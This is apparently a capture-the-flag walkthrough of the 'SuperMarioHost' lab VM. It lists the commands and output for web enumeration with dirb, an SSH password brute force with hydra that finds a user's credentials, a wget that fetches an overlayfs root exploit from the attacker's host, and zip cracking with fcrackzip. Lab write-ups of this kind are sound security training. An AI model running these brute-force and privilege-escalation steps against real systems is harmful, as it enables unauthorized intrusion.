vhosts gave me

    	# The ServerName directive sets the request scheme, hostname and port that
    	# the server uses to identify itself. This is used when creating
    	# redirection URLs. In the context of virtual hosts, the ServerName
    	# specifies what hostname must appear in the request's Host: header to
    	# match this virtual host. For the default virtual host (this file) this
    	# value is not decisive as it is used as a last resort host regardless.
    	# However, you must set it for any further virtual host explicitly.

    	ServerName mario.supermariohost.local
    	ServerAdmin webmaster@localhost
    	DocumentRoot /var/www/supermariohost
    	DirectoryIndex mario.php

    	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
    	# error, crit, alert, emerg.
    	# It is also possible to configure the loglevel for particular
    	# modules, e.g.
    	#LogLevel info ssl:warn

    	ErrorLog ${APACHE_LOG_DIR}/supermariohost_error.log

    	# For most configuration files from conf-available/, which are
    	# enabled or disabled at a global level, it is possible to
    	# include a line for only one particular virtual host. For example the
    	# following line enables the CGI configuration for this host only
    	# after it has been globally disabled with "a2disconf".
    	#Include conf-available/serve-cgi-bin.conf
    </VirtualHost>
There is a virtual host on the host so i added mario.supermariohost.local to /etc/hosts
then i tried mario.supermariohost.local:8180 and it gave me this

    It'sa meeeee, Maaaaario! Welcome to Super Mario Host! Me and my tall brother
    had the idea of making a tribute for this machine, we still trying to figure
    out what to do to keep you entertained! In the meantime you can play with
    this nice game I've added for you :D Credits to Mark Robbins, the source
    code of the game can be found here.
    Controls

$ dirb http://mario.supermariohost.local:8180 /usr/share/wordlists/dirb/big.txt -X .php

    + http://mario.supermariohost.local:8180/mario.php (CODE:200|SIZE:7080)
command.php is a page to confirm a user exits or not so i tried all Mario's character
{mario, luigi, peach, yoshi, toad}
http://mario.supermariohost.local:8180/command.php?username=""
and the all exists!! -- Later you ll see it's just a false code

Attacking Phase:

Then i made a list of these name and tried it with hydra no luck then tried to mixed it up
$ john --wordlist:user --rules --stdout > pass
$ hydra -L user -P pass -t 3 192.168.190.132 ssh
    [ssh] host: 192.168.190.132   login: luigi   password: luigi1

$ ssh luigi@192.168.190.132
    password:luigi1

Then i downloaded overlayfs exploit https://www.exploit-db.com/exploits/37292/ on my
local machine then i copied it to supermariohost's and compile it
$ wget http://192.168.190.1/ofs.c

$ cd /root
$ ls

Then i copied flag.zip on my local machine , and crack it using fcrackzip
$ fcrackzip flag.zip -D -p /usr/share/wordlists/rockyou.txt -u
    PASSWORD FOUND!!!!: pw == ilovepeach
$ unzip flag.zip
    [flag.zip] flag.txt password:

$ cat flag.txt
    Well done :D If you reached this it means you got root, congratulations.
    Now, there are multiple ways to hack this machine. The goal is to get all
    the passwords of all the users in this machine. If you did it, then congratulations,
    I hope you had fun :D

    Keep in touch on twitter through @mr_h4sh

    Congratulations again!

    I know that he loves Peach, but Peach Loves Me.

i tried peachlovesme and it worked!

    Congratulations on your second flag!
